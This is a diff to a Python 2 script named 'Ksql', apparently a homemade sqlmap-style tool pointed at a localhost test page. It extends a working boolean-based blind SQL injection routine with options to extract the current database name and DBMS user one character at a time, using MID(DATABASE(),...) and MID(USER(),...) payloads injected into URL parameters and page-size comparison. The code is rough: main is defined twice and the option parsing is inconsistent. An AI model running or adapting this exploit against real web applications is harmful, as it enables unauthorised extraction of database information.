@@ -6,15 +6,20 @@
 	version:	Ksql 1.0
 """
 
-import sys, os, io, inspect, string, time, urllib, re, urlparse, difflib, chardet, filecmp, json
+import sys, os, io, inspect, string, time, urllib, re, urlparse, difflib, chardet, filecmp, json, getopt
 from difflib import *
 import threading
-from time import ctime,sleep
+from time import ctime,sleep 
+
 
 reload(sys)
-#sys.setdefaultencoding('utf-8')
 sys.setdefaultencoding('utf8')
 
+def main(argv):
+     for arg in argv:
+        print arg
+		
+		
 def modulePath():
     """
     This will get us the program's directory, even if we are frozen
@@ -49,23 +54,28 @@ def htmlDecode(string):
 	return tmpHtmlEncode
 	
 
-def run(tmpUrl, num, succPageSize, frontThread):
+def run(type, tmpUrl, num, succPageSize, frontThread):
 	
 	if frontThread != None: 
 		frontThread.join()
 
-	ITOA64 = "abcdefghijklmnopqrstuvwxyz"
+	ITOA64 = "abcdefghijklmnopqrstuvwxyz@0123456789"
 	for word in ITOA64:
 
 		newUrl = tmpUrl
-		newUrl = newUrl.replace('[[[ID]]]', '1" AND MID(DATABASE(),' + str(num) + ',1)="' + word)
-
+		
+		if type == '--current-db':
+			newUrl = newUrl.replace('[[[ID]]]', '1" AND MID(DATABASE(),' + str(num) + ',1)="' + word)
+		
+		elif type == '--current-user':
+			newUrl = newUrl.replace('[[[ID]]]', '1" AND MID(USER(),' + str(num) + ',1)="' + word)
+			
 		currPageSize = len(htmlDecode(urllib.urlopen(newUrl).read()))
 		
 		print newUrl
 		
 		if succPageSize == currPageSize:
-			file_object = open('database.log', 'a')
+			file_object = open('infomation.log', 'a')
 			file_object.write(word)
 			file_object.close()
 			print '================: ' + word
@@ -73,7 +83,7 @@ def run(tmpUrl, num, succPageSize, frontThread):
 			
 		print "Time: %s \r\n" %(ctime())
 		time.sleep(0.1)
-	
+
 	
 SQLMAP_ROOT_PATH = modulePath()
 KSQL_XML_PATH = os.path.join(SQLMAP_ROOT_PATH, "xml")
@@ -83,18 +93,18 @@ QUERIES_XML = os.path.join(KSQL_XML_PATH, "queries.xml")
 url = 'http://localhost/test/test.php?id=1&name=kaysen'
 
 
-if os.path.exists('database.log'):
-	os.remove('database.log')
+if os.path.exists('infomation.log'):
+	os.remove('infomation.log')
 
-
-'''
-	暂时先只处理一个参数
-'''
-if __name__ == '__main__':
-
+	
+def manage(type):	
 	values = url.split('?')[-1]
 	host = url.split('?')[0]
 	tmpUrl = ''
+	
+	'''
+	暂时先只处理一个参数
+	'''
 	for key_value in values.split('&'):
 		val = key_value.split('=')
 		tmpUrl = host + '?' + val[0] + '=[[[' + val[0].upper() + ']]]'
@@ -103,16 +113,16 @@ if __name__ == '__main__':
 
 
 	''' Blind SQL Injection '''
-	# 成功的页面大小数
 	succPageSize = len(htmlDecode(urllib.urlopen(url).read()))
 	threads = []
-	for num in range(1, 5):
+	''' 枚举位数 '''
+	for num in range(1, 15):
 		#run(tmpUrl, num, succPageSize)
 		
 		if len(threads) == 0:
-			threads.append(threading.Thread(target=run,args=(tmpUrl, num, succPageSize, None)))
+			threads.append(threading.Thread(target=run,args=(type, tmpUrl, num, succPageSize, None)))
 		else:
-			threads.append(threading.Thread(target=run,args=(tmpUrl, num, succPageSize, threads[-1])))
+			threads.append(threading.Thread(target=run,args=(type, tmpUrl, num, succPageSize, threads[-1])))
 	
 	for item in threads:
 		item.setDaemon(True)
@@ -122,11 +132,55 @@ if __name__ == '__main__':
 	
 	
 
-	file_object = open('database.log', 'r')
+	file_object = open('infomation.log', 'r')
 	try:
 		 all_the_text = file_object.read()
 	finally:
 		 file_object.close()
 
-	print 'database: ',all_the_text
+		 
+	print "Result: " + all_the_text
+	
+
+def Usage():
+	print 'Ksql.py usage:'
+	print '--current-user, Retrieve DBMS current user'
+	print '--current-db, Retrieve DBMS current database'
+	print '-h, --help: print help message.'
+	print '-v, --version: print script version'
+def Version():
+    print 'Ksql v1.0'
+def OutPut(args):
+    print 'Hello, %s'%args
+def main(argv):
+	if len(argv) == 1:
+		Usage()
+		sys.exit(2)
+
+	try:
+		opts, args = getopt.getopt(argv[1:], 'hv:', ['current-db', 'current-user'])
+	except getopt.GetoptError, err:
+		print str(err)
+		Usage()
+		sys.exit(2)
+
+		
+	for o, a in opts:
+		if o in ('--current-db', '--current-user'):
+			manage(o)
+			sys.exit(0)
+		elif o in ('-h', '--help'):
+			Usage()
+			sys.exit(1)
+		elif o in ('-v', '--version'):
+			Version()
+			sys.exit(0)
+		else:
+			print 'unhandled option'
+			sys.exit(3)
+
+if __name__ == '__main__':
+	main(sys.argv)
+		
+
 	
